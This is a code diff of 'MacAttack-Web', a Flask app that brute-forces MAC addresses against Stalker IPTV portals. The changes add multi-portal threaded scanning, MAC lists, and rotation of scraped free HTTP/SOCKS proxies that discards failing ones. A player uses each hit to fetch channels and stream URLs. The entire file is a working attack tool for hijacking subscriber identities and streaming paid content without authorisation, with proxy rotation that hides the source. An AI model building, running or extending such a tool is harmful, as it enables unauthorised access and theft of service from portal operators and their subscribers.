@@ -1,6 +1,7 @@
 """
 MacAttack-Web - Web-based MAC Address Testing Tool for Stalker Portals
 A Flask-based Linux/Docker version of MacAttack with Web UI
+Features: Multi-Portal Scanning, Proxy Error Tracking, SOCKS Support
 """
 import os
 import json
@@ -9,9 +10,11 @@ import random
 import time
 import threading
 import secrets
+import re
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import contextmanager
+from collections import defaultdict
 
 from flask import Flask, render_template, request, jsonify, Response
 import requests
@@ -19,15 +22,13 @@ import waitress
 
 import stb
 
-# Version
-VERSION = "1.0.0"
+VERSION = "1.2.0"
 
 # Logging setup
 logger = logging.getLogger("MacAttack")
 logger.setLevel(logging.INFO)
 logFormat = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
 
-# Docker-optimized paths
 if os.getenv("CONFIG"):
     configFile = os.getenv("CONFIG")
     log_dir = os.path.dirname(configFile)
@@ -47,28 +48,23 @@ consoleHandler = logging.StreamHandler()
 consoleHandler.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
 logger.addHandler(consoleHandler)
 
-# Flask app
 app = Flask(__name__)
 app.secret_key = secrets.token_urlsafe(32)
 
-# Host configuration
-host = os.getenv("HOST", "0.0.0.0:8080")
+host = os.getenv("HOST", "0.0.0.0:5002")
 logger.info(f"Server will start on http://{host}")
 
 # Global state
 config = {}
-attack_state = {
-    "running": False,
-    "paused": False,
-    "tested": 0,
-    "hits": 0,
-    "errors": 0,
-    "current_mac": "",
-    "found_macs": [],
-    "logs": [],
-    "start_time": None,
-    "threads": []
-}
+
+# Multi-portal attack states
+attack_states = {}  # portal_id -> attack_state
+attack_states_lock = threading.Lock()
+
+# Proxy error tracking (like original MacAttack)
+proxy_error_counts = defaultdict(int)  # proxy -> error count
+proxy_error_connect_counts = defaultdict(int)  # proxy -> connection error count
+MAX_PROXY_ERRORS = 5  # Remove proxy after this many errors
 
 proxy_state = {
     "fetching": False,
@@ -87,11 +83,19 @@ defaultSettings = {
     "mac_prefix": "00:1A:79:",
     "output_format": "mac_only",
     "auto_save": True,
+    "max_proxy_errors": 5,
 }
+
+# Default proxy sources
+DEFAULT_PROXY_SOURCES = [
+    "https://spys.me/proxy.txt",
+    "https://free-proxy-list.net/",
+    "https://www.us-proxy.org/",
+    "https://www.sslproxies.org/",
+]
 
 
 def load_config():
-    """Load configuration from file."""
     global config
     try:
         with open(configFile) as f:
@@ -107,6 +111,9 @@ def load_config():
     config.setdefault("settings", {})
     config.setdefault("found_macs", [])
     config.setdefault("proxies", [])
+    config.setdefault("portals", [])
+    config.setdefault("mac_list", [])
+    config.setdefault("proxy_sources", DEFAULT_PROXY_SOURCES.copy())
     
     for key, default in defaultSettings.items():
         config["settings"].setdefault(key, default)
@@ -116,7 +123,6 @@ def load_config():
 
 
 def save_config():
-    """Save configuration to file."""
     try:
         with open(configFile, "w") as f:
             json.dump(config, f, indent=4)
@@ -125,34 +131,54 @@ def save_config():
 
 
 def get_settings():
-    """Get current settings."""
     if not config:
         load_config()
     return config.get("settings", defaultSettings)
 
 
 def generate_mac(prefix="00:1A:79:"):
-    """Generate a random MAC address with given prefix."""
     suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
     return f"{prefix}{suffix}"
 
 
 def add_log(state, message, level="info"):
-    """Add a log message to state."""
     timestamp = datetime.now().strftime("%H:%M:%S")
-    state["logs"].append({
-        "time": timestamp,
-        "level": level,
-        "message": message
-    })
-    # Keep only last 500 logs
+    state["logs"].append({"time": timestamp, "level": level, "message": message})
     if len(state["logs"]) > 500:
         state["logs"] = state["logs"][-500:]
 
 
+def get_working_proxy():
+    """Get a working proxy, respecting error counts like original MacAttack."""
+    global proxy_error_counts
+    proxies = config.get("proxies", [])
+    if not proxies:
+        return None
+    
+    max_errors = get_settings().get("max_proxy_errors", MAX_PROXY_ERRORS)
+    
+    # Filter out proxies with too many errors
+    working = [p for p in proxies if proxy_error_counts[p] < max_errors]
+    
+    if not working:
+        # Reset error counts if all proxies are exhausted
+        proxy_error_counts.clear()
+        working = proxies
+    
+    return random.choice(working) if working else None
+
+
+def mark_proxy_error(proxy, is_connection_error=False):
+    """Mark a proxy as having an error - like original MacAttack."""
+    global proxy_error_counts, proxy_error_connect_counts
+    if proxy:
+        proxy_error_counts[proxy] += 1
+        if is_connection_error:
+            proxy_error_connect_counts[proxy] += 1
+
+
 @contextmanager
 def no_proxy_environment():
-    """Context manager to temporarily unset proxy environment variables."""
     original_http = os.environ.get("http_proxy")
     original_https = os.environ.get("https_proxy")
     try:
@@ -172,173 +198,359 @@ def no_proxy_environment():
 
 @app.route("/")
 def index():
-    """Main page."""
     return render_template("index.html", version=VERSION)
 
 
 @app.route("/api/settings", methods=["GET", "POST"])
 def api_settings():
-    """Get or update settings."""
     if request.method == "GET":
         return jsonify(get_settings())
     
     data = request.json
     settings = get_settings()
-    
     for key in data:
         if key in settings:
             settings[key] = data[key]
-    
     config["settings"] = settings
     save_config()
-    
     return jsonify({"success": True, "settings": settings})
 
 
-@app.route("/api/attack/start", methods=["POST"])
-def api_attack_start():
-    """Start MAC attack."""
-    global attack_state
-    
-    if attack_state["running"]:
-        return jsonify({"success": False, "error": "Attack already running"})
+# ============== PORTALS MANAGEMENT ==============
+
+@app.route("/api/portals", methods=["GET", "POST"])
+def api_portals():
+    if request.method == "GET":
+        return jsonify(config.get("portals", []))
     
     data = request.json
-    portal_url = data.get("url", "").strip()
+    portal = {
+        "id": secrets.token_hex(8),
+        "name": data.get("name", "").strip(),
+        "url": data.get("url", "").strip(),
+        "enabled": data.get("enabled", True),
+        "created_at": datetime.now().isoformat()
+    }
     
-    if not portal_url:
-        return jsonify({"success": False, "error": "Portal URL required"})
+    if portal["url"] and not portal["url"].startswith("http"):
+        portal["url"] = f"http://{portal['url']}"
+    if not portal["name"]:
+        portal["name"] = portal["url"]
     
-    # Normalize URL
-    if not portal_url.startswith("http"):
-        portal_url = f"http://{portal_url}"
+    config["portals"].append(portal)
+    save_config()
+    return jsonify({"success": True, "portal": portal})
+
+
+@app.route("/api/portals/<portal_id>", methods=["PUT", "DELETE"])
+def api_portal_manage(portal_id):
+    portals = config.get("portals", [])
     
-    # Reset state
-    attack_state = {
+    if request.method == "DELETE":
+        config["portals"] = [p for p in portals if p.get("id") != portal_id]
+        save_config()
+        return jsonify({"success": True})
+    
+    if request.method == "PUT":
+        data = request.json
+        for portal in portals:
+            if portal.get("id") == portal_id:
+                portal["name"] = data.get("name", portal["name"])
+                portal["url"] = data.get("url", portal["url"])
+                portal["enabled"] = data.get("enabled", portal["enabled"])
+                break
+        save_config()
+        return jsonify({"success": True})
+
+
+# ============== MAC LIST MANAGEMENT ==============
+
+@app.route("/api/maclist", methods=["GET", "POST", "DELETE"])
+def api_maclist():
+    if request.method == "GET":
+        return jsonify({"macs": config.get("mac_list", []), "count": len(config.get("mac_list", []))})
+    
+    if request.method == "POST":
+        data = request.json
+        macs_text = data.get("macs", "")
+        macs = []
+        for line in macs_text.strip().split("\n"):
+            mac = line.strip().upper()
+            if mac and len(mac) >= 11:
+                mac = mac.replace("-", ":").replace(".", ":")
+                if mac not in macs:
+                    macs.append(mac)
+        config["mac_list"] = macs
+        save_config()
+        return jsonify({"success": True, "count": len(macs)})
+    
+    if request.method == "DELETE":
+        config["mac_list"] = []
+        save_config()
+        return jsonify({"success": True})
+
+
+@app.route("/api/maclist/import", methods=["POST"])
+def api_maclist_import():
+    if "file" not in request.files:
+        return jsonify({"success": False, "error": "No file uploaded"})
+    
+    file = request.files["file"]
+    content = file.read().decode("utf-8", errors="ignore")
+    
+    macs = []
+    for line in content.strip().split("\n"):
+        mac = line.strip().upper()
+        if mac and len(mac) >= 11:
+            mac = mac.replace("-", ":").replace(".", ":")
+            if mac not in macs:
+                macs.append(mac)
+    
+    config["mac_list"] = macs
+    save_config()
+    return jsonify({"success": True, "count": len(macs)})
+
+
+# ============== MULTI-PORTAL ATTACK ==============
+
+def create_attack_state(portal_id, portal_url, mode="random"):
+    """Create a new attack state for a portal."""
+    return {
+        "id": portal_id,
         "running": True,
         "paused": False,
         "tested": 0,
         "hits": 0,
         "errors": 0,
         "current_mac": "",
+        "current_proxy": "",
         "found_macs": [],
         "logs": [],
         "start_time": time.time(),
         "portal_url": portal_url,
-        "threads": []
+        "mode": mode,
+        "mac_list_index": 0,
+        "mac_list_total": len(config.get("mac_list", [])) if mode == "list" else 0
     }
+
+
+@app.route("/api/attack/start", methods=["POST"])
+def api_attack_start():
+    """Start attack on one or multiple portals."""
+    data = request.json
+    portal_urls = data.get("urls", [])  # List of URLs for multi-portal
+    single_url = data.get("url", "").strip()  # Single URL (backward compatible)
+    mode = data.get("mode", "random")
     
-    add_log(attack_state, f"Starting attack on {portal_url}", "info")
+    # Handle single URL
+    if single_url and not portal_urls:
+        portal_urls = [single_url]
     
-    # Start attack thread
-    thread = threading.Thread(target=run_attack, args=(portal_url,), daemon=True)
-    thread.start()
-    attack_state["threads"].append(thread)
+    if not portal_urls:
+        return jsonify({"success": False, "error": "Portal URL(s) required"})
     
-    return jsonify({"success": True})
+    if mode == "list" and not config.get("mac_list"):
+        return jsonify({"success": False, "error": "MAC list is empty"})
+    
+    started = []
+    for url in portal_urls:
+        if not url.startswith("http"):
+            url = f"http://{url}"
+        
+        portal_id = secrets.token_hex(4)
+        
+        with attack_states_lock:
+            attack_states[portal_id] = create_attack_state(portal_id, url, mode)
+        
+        add_log(attack_states[portal_id], f"Starting attack on {url}", "info")
+        
+        thread = threading.Thread(target=run_attack, args=(portal_id,), daemon=True)
+        thread.start()
+        
+        started.append({"id": portal_id, "url": url})
+    
+    return jsonify({"success": True, "attacks": started})
 
 
 @app.route("/api/attack/stop", methods=["POST"])
 def api_attack_stop():
-    """Stop MAC attack."""
-    global attack_state
-    attack_state["running"] = False
-    attack_state["paused"] = False
-    add_log(attack_state, "Attack stopped by user", "warning")
+    """Stop attack(s)."""
+    data = request.json
+    portal_id = data.get("id")  # Specific portal or None for all
+    
+    with attack_states_lock:
+        if portal_id:
+            if portal_id in attack_states:
+                attack_states[portal_id]["running"] = False
+                add_log(attack_states[portal_id], "Attack stopped", "warning")
+        else:
+            for state in attack_states.values():
+                state["running"] = False
+                add_log(state, "Attack stopped", "warning")
+    
     return jsonify({"success": True})
 
 
 @app.route("/api/attack/pause", methods=["POST"])
 def api_attack_pause():
-    """Pause/resume MAC attack."""
-    global attack_state
-    attack_state["paused"] = not attack_state["paused"]
-    status = "paused" if attack_state["paused"] else "resumed"
-    add_log(attack_state, f"Attack {status}", "info")
-    return jsonify({"success": True, "paused": attack_state["paused"]})
+    data = request.json
+    portal_id = data.get("id")
+    
+    with attack_states_lock:
+        if portal_id and portal_id in attack_states:
+            attack_states[portal_id]["paused"] = not attack_states[portal_id]["paused"]
+            status = "paused" if attack_states[portal_id]["paused"] else "resumed"
+            add_log(attack_states[portal_id], f"Attack {status}", "info")
+            return jsonify({"success": True, "paused": attack_states[portal_id]["paused"]})
+    
+    return jsonify({"success": False})
 
 
 @app.route("/api/attack/status")
 def api_attack_status():
-    """Get attack status."""
-    elapsed = 0
-    if attack_state["start_time"]:
-        elapsed = int(time.time() - attack_state["start_time"])
+    """Get status of all running attacks."""
+    portal_id = request.args.get("id")
     
-    return jsonify({
-        "running": attack_state["running"],
-        "paused": attack_state["paused"],
-        "tested": attack_state["tested"],
-        "hits": attack_state["hits"],
-        "errors": attack_state["errors"],
-        "current_mac": attack_state["current_mac"],
-        "found_macs": attack_state["found_macs"][-50:],
-        "logs": attack_state["logs"][-100:],
-        "elapsed": elapsed
-    })
+    with attack_states_lock:
+        if portal_id:
+            state = attack_states.get(portal_id, {})
+            if state:
+                elapsed = int(time.time() - state.get("start_time", time.time()))
+                return jsonify({
+                    "id": portal_id,
+                    "running": state.get("running", False),
+                    "paused": state.get("paused", False),
+                    "tested": state.get("tested", 0),
+                    "hits": state.get("hits", 0),
+                    "errors": state.get("errors", 0),
+                    "current_mac": state.get("current_mac", ""),
+                    "current_proxy": state.get("current_proxy", ""),
+                    "found_macs": state.get("found_macs", [])[-50:],
+                    "logs": state.get("logs", [])[-100:],
+                    "elapsed": elapsed,
+                    "mode": state.get("mode", "random"),
+                    "mac_list_index": state.get("mac_list_index", 0),
+                    "mac_list_total": state.get("mac_list_total", 0),
+                    "portal_url": state.get("portal_url", "")
+                })
+        
+        # Return all attacks
+        all_attacks = []
+        for pid, state in attack_states.items():
+            elapsed = int(time.time() - state.get("start_time", time.time()))
+            all_attacks.append({
+                "id": pid,
+                "running": state.get("running", False),
+                "paused": state.get("paused", False),
+                "tested": state.get("tested", 0),
+                "hits": state.get("hits", 0),
+                "errors": state.get("errors", 0),
+                "current_mac": state.get("current_mac", ""),
+                "current_proxy": state.get("current_proxy", ""),
+                "found_macs": state.get("found_macs", [])[-20:],
+                "logs": state.get("logs", [])[-50:],
+                "elapsed": elapsed,
+                "portal_url": state.get("portal_url", "")
+            })
+        
+        return jsonify({"attacks": all_attacks})
 
 
-def run_attack(portal_url):
-    """Run the MAC attack."""
-    global attack_state
+@app.route("/api/attack/clear", methods=["POST"])
+def api_attack_clear():
+    """Clear finished attacks from list."""
+    with attack_states_lock:
+        finished = [pid for pid, state in attack_states.items() if not state.get("running")]
+        for pid in finished:
+            del attack_states[pid]
+    return jsonify({"success": True, "cleared": len(finished)})
+
+
+def run_attack(portal_id):
+    """Run the MAC attack for a specific portal."""
+    global proxy_error_counts
     
+    with attack_states_lock:
+        if portal_id not in attack_states:
+            return
+        state = attack_states[portal_id]
+    
+    portal_url = state["portal_url"]
     settings = get_settings()
     speed = settings.get("speed", 10)
     timeout = settings.get("timeout", 10)
     use_proxies = settings.get("use_proxies", False)
     mac_prefix = settings.get("mac_prefix", "00:1A:79:")
+    mode = state.get("mode", "random")
+    max_proxy_errors = settings.get("max_proxy_errors", MAX_PROXY_ERRORS)
     
     proxies = config.get("proxies", []) if use_proxies else []
     proxy_index = 0
+    mac_list = config.get("mac_list", []) if mode == "list" else []
+    mac_list_index = 0
     
-    add_log(attack_state, f"Attack started with {speed} threads", "info")
+    add_log(state, f"Attack started with {speed} threads", "info")
+    if use_proxies and proxies:
+        add_log(state, f"Using {len(proxies)} proxies (SOCKS4/5 supported)", "info")
     
     with ThreadPoolExecutor(max_workers=speed) as executor:
         futures = {}
         
-        while attack_state["running"]:
-            # Handle pause
-            while attack_state["paused"] and attack_state["running"]:
+        while state["running"]:
+            while state["paused"] and state["running"]:
                 time.sleep(0.5)
             
-            if not attack_state["running"]:
+            if not state["running"]:
                 break
             
-            # Submit new tasks
-            while len(futures) < speed and attack_state["running"]:
-                mac = generate_mac(mac_prefix)
-                proxy = None
+            if mode == "list" and mac_list_index >= len(mac_list):
+                add_log(state, "MAC list exhausted. Attack complete.", "success")
+                break
+            
+            while len(futures) < speed and state["running"]:
+                if mode == "list":
+                    if mac_list_index >= len(mac_list):
+                        break
+                    mac = mac_list[mac_list_index]
+                    mac_list_index += 1
+                    state["mac_list_index"] = mac_list_index
+                else:
+                    mac = generate_mac(mac_prefix)
                 
+                proxy = None
                 if proxies:
-                    proxy = proxies[proxy_index % len(proxies)]
+                    # Get proxy respecting error counts
+                    working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
+                    if not working_proxies:
+                        proxy_error_counts.clear()
+                        working_proxies = proxies
+                    proxy = working_proxies[proxy_index % len(working_proxies)]
                     proxy_index += 1
+                    state["current_proxy"] = proxy
                 
                 future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
-                futures[future] = mac
+                futures[future] = (mac, proxy)
             
-            # Process completed futures
-            done_futures = []
-            for future in list(futures.keys()):
-                if future.done():
-                    done_futures.append(future)
+            done_futures = [f for f in futures if f.done()]
             
             for future in done_futures:
-                mac = futures.pop(future)
+                mac, proxy = futures.pop(future)
                 try:
                     success, expiry, message = future.result()
-                    attack_state["tested"] += 1
-                    attack_state["current_mac"] = mac
+                    state["tested"] += 1
+                    state["current_mac"] = mac
+                    
+                    proxy_info = f" via {proxy}" if proxy else ""
                     
                     if success:
-                        attack_state["hits"] += 1
-                        attack_state["found_macs"].append({
+                        state["hits"] += 1
+                        state["found_macs"].append({
                             "mac": mac,
                             "expiry": expiry,
                             "time": datetime.now().strftime("%H:%M:%S")
                         })
-                        add_log(attack_state, f"HIT! {mac} - Expiry: {expiry}", "success")
+                        add_log(state, f"HIT! {mac} - Expiry: {expiry}{proxy_info}", "success")
                         
-                        # Save to config
                         config["found_macs"].append({
                             "mac": mac,
                             "expiry": expiry,
@@ -347,31 +559,38 @@ def run_attack(portal_url):
                         })
                         if settings.get("auto_save", True):
                             save_config()
+                    else:
+                        # Track proxy errors
+                        if "timeout" in message.lower() or "connection" in message.lower():
+                            mark_proxy_error(proxy, is_connection_error=True)
+                        
+                        if state["tested"] % 100 == 0:
+                            add_log(state, f"Tested {state['tested']} MACs...{proxy_info}", "info")
                     
                 except Exception as e:
-                    attack_state["errors"] += 1
-                    add_log(attack_state, f"Error testing {mac}: {str(e)}", "error")
+                    state["errors"] += 1
+                    mark_proxy_error(proxy, is_connection_error=True)
+                    add_log(state, f"Error: {str(e)}", "error")
             
             time.sleep(0.01)
     
-    attack_state["running"] = False
-    add_log(attack_state, f"Attack finished. Tested: {attack_state['tested']}, Hits: {attack_state['hits']}", "info")
+    state["running"] = False
+    add_log(state, f"Finished. Tested: {state['tested']}, Hits: {state['hits']}", "info")
 
 
 def test_mac_worker(portal_url, mac, proxy, timeout):
-    """Worker function to test a single MAC."""
     return stb.test_mac(portal_url, mac, proxy, timeout)
 
 
-# ============== PROXY ROUTES ==============
+# ============== PROXY ROUTES WITH CUSTOM SOURCES ==============
 
 @app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
 def api_proxies():
-    """Manage proxies."""
     if request.method == "GET":
         return jsonify({
             "proxies": config.get("proxies", []),
-            "state": proxy_state
+            "state": proxy_state,
+            "error_counts": dict(proxy_error_counts)
         })
     
     if request.method == "POST":
@@ -384,13 +603,29 @@ def api_proxies():
     
     if request.method == "DELETE":
         config["proxies"] = []
+        proxy_error_counts.clear()
         save_config()
         return jsonify({"success": True})
 
 
+@app.route("/api/proxies/sources", methods=["GET", "POST"])
+def api_proxy_sources():
+    """Manage custom proxy sources."""
+    if request.method == "GET":
+        return jsonify({"sources": config.get("proxy_sources", DEFAULT_PROXY_SOURCES)})
+    
+    if request.method == "POST":
+        data = request.json
+        sources = data.get("sources", [])
+        if isinstance(sources, str):
+            sources = [s.strip() for s in sources.split("\n") if s.strip()]
+        config["proxy_sources"] = sources
+        save_config()
+        return jsonify({"success": True, "count": len(sources)})
+
+
 @app.route("/api/proxies/fetch", methods=["POST"])
 def api_proxies_fetch():
-    """Fetch proxies from public sources."""
     global proxy_state
     
     if proxy_state["fetching"]:
@@ -407,7 +642,6 @@ def api_proxies_fetch():
 
 @app.route("/api/proxies/test", methods=["POST"])
 def api_proxies_test():
-    """Test proxies."""
     global proxy_state
     
     if proxy_state["testing"]:
@@ -424,21 +658,23 @@ def api_proxies_test():
 
 @app.route("/api/proxies/status")
 def api_proxies_status():
-    """Get proxy status."""
     return jsonify(proxy_state)
 
 
+@app.route("/api/proxies/reset-errors", methods=["POST"])
+def api_proxies_reset_errors():
+    """Reset proxy error counts."""
+    global proxy_error_counts, proxy_error_connect_counts
+    proxy_error_counts.clear()
+    proxy_error_connect_counts.clear()
+    return jsonify({"success": True})
+
+
 def fetch_proxies_worker():
-    """Fetch proxies from public sources."""
+    """Fetch proxies from all sources including custom ones."""
     global proxy_state
     
-    sources = [
-        "https://spys.me/proxy.txt",
-        "https://free-proxy-list.net/",
-        "https://www.us-proxy.org/",
-        "https://www.sslproxies.org/",
-    ]
-    
+    sources = config.get("proxy_sources", DEFAULT_PROXY_SOURCES)
     all_proxies = []
     
     for source in sources:
@@ -448,19 +684,29 @@ def fetch_proxies_worker():
                 response = requests.get(source, timeout=15)
                 
                 if "spys.me" in source:
-                    import re
                     matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
                     all_proxies.extend(matches)
-                else:
-                    import re
-                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
+                elif "freeproxy.world" in source:
+                    matches = re.findall(
+                        r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
+                        r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>',
+                        response.text
+                    )
                     all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
+                else:
+                    # Generic parsing for most proxy list sites
+                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
+                    if matches:
+                        all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
+                    else:
+                        # Try plain text format
+                        matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
+                        all_proxies.extend(matches)
                 
-                add_log(proxy_state, f"Found {len(matches)} proxies from {source}", "info")
+                add_log(proxy_state, f"Found proxies from {source}", "info")
         except Exception as e:
             add_log(proxy_state, f"Error fetching from {source}: {e}", "error")
     
-    # Remove duplicates
     all_proxies = list(set(all_proxies))
     proxy_state["proxies"] = all_proxies
     
@@ -469,7 +715,7 @@ def fetch_proxies_worker():
 
 
 def test_proxies_worker():
-    """Test proxies for validity."""
+    """Test proxies for validity - supports HTTP, SOCKS4, SOCKS5."""
     global proxy_state
     
     proxies = config.get("proxies", [])
@@ -487,9 +733,10 @@ def test_proxies_worker():
     def test_proxy(proxy):
         try:
             with no_proxy_environment():
+                proxy_dict = stb.parse_proxy(proxy)
                 response = requests.get(
                     "http://httpbin.org/ip",
-                    proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
+                    proxies=proxy_dict,
                     timeout=10
                 )
                 if response.status_code == 200:
@@ -511,6 +758,7 @@ def test_proxies_worker():
     
     proxy_state["working_proxies"] = working
     config["proxies"] = working
+    proxy_error_counts.clear()
     save_config()
     
     add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working", "success")
@@ -521,7 +769,6 @@ def test_proxies_worker():
 
 @app.route("/api/player/connect", methods=["POST"])
 def api_player_connect():
-    """Connect to portal and get playlist."""
     data = request.json
     url = data.get("url", "").strip()
     mac = data.get("mac", "").strip().upper()
@@ -539,56 +786,49 @@ def api_player_connect():
         if not token:
             return jsonify({"success": False, "error": "Failed to get token"})
         
-        # Get categories
-        genres = stb.get_genres(url, mac, token, portal_type, proxy)
-        vod_cats = stb.get_vod_categories(url, mac, token, portal_type, proxy)
-        series_cats = stb.get_series_categories(url, mac, token, portal_type, proxy)
+        genres = stb.get_genres(url, mac, token, portal_type, token_random, proxy)
+        vod_cats = stb.get_vod_categories(url, mac, token, portal_type, token_random, proxy)
+        series_cats = stb.get_series_categories(url, mac, token, portal_type, token_random, proxy)
         
         return jsonify({
             "success": True,
             "token": token,
+            "token_random": token_random,
             "portal_type": portal_type,
             "live": [{"id": g["id"], "name": g["title"]} for g in genres],
             "vod": [{"id": c["id"], "name": c["title"]} for c in vod_cats],
             "series": [{"id": c["id"], "name": c["title"]} for c in series_cats]
         })
-        
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
 
 @app.route("/api/player/channels", methods=["POST"])
 def api_player_channels():
-    """Get channels from a category."""
     data = request.json
     url = data.get("url", "").strip()
     mac = data.get("mac", "").strip().upper()
     token = data.get("token", "")
+    token_random = data.get("token_random")
     portal_type = data.get("portal_type", "portal.php")
     category_type = data.get("category_type", "IPTV")
     category_id = data.get("category_id", "")
     proxy = data.get("proxy", "").strip() or None
     
     try:
-        channels, total = stb.get_channels(url, mac, token, portal_type, category_type, category_id, proxy)
-        
-        return jsonify({
-            "success": True,
-            "channels": channels,
-            "total": total
-        })
-        
+        channels, total = stb.get_channels(url, mac, token, portal_type, category_type, category_id, token_random, proxy)
+        return jsonify({"success": True, "channels": channels, "total": total})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
 
 @app.route("/api/player/stream", methods=["POST"])
 def api_player_stream():
-    """Get stream URL for a channel."""
     data = request.json
     url = data.get("url", "").strip()
     mac = data.get("mac", "").strip().upper()
     token = data.get("token", "")
+    token_random = data.get("token_random")
     portal_type = data.get("portal_type", "portal.php")
     cmd = data.get("cmd", "")
     content_type = data.get("content_type", "live")
@@ -596,15 +836,14 @@ def api_player_stream():
     
     try:
         if content_type == "vod":
-            stream_url = stb.get_vod_stream_url(url, mac, token, portal_type, cmd, proxy)
+            stream_url = stb.get_vod_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
         else:
-            stream_url = stb.get_stream_url(url, mac, token, portal_type, cmd, proxy)
+            stream_url = stb.get_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
         
         if stream_url:
             return jsonify({"success": True, "stream_url": stream_url})
         else:
             return jsonify({"success": False, "error": "Failed to get stream URL"})
-        
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
@@ -613,7 +852,6 @@ def api_player_stream():
 
 @app.route("/api/found", methods=["GET", "DELETE"])
 def api_found():
-    """Get or clear found MACs."""
     if request.method == "GET":
         return jsonify(config.get("found_macs", []))
     
@@ -625,7 +863,6 @@ def api_found():
 
 @app.route("/api/found/export")
 def api_found_export():
-    """Export found MACs."""
     format_type = request.args.get("format", "txt")
     found = config.get("found_macs", [])
     
@@ -652,7 +889,7 @@ if __name__ == "__main__":
     
     host_parts = host.split(":")
     bind_host = host_parts[0]
-    bind_port = int(host_parts[1]) if len(host_parts) > 1 else 8080
+    bind_port = int(host_parts[1]) if len(host_parts) > 1 else 5002
     
     logger.info(f"Server running on http://{bind_host}:{bind_port}")
     waitress.serve(app, host=bind_host, port=bind_port)
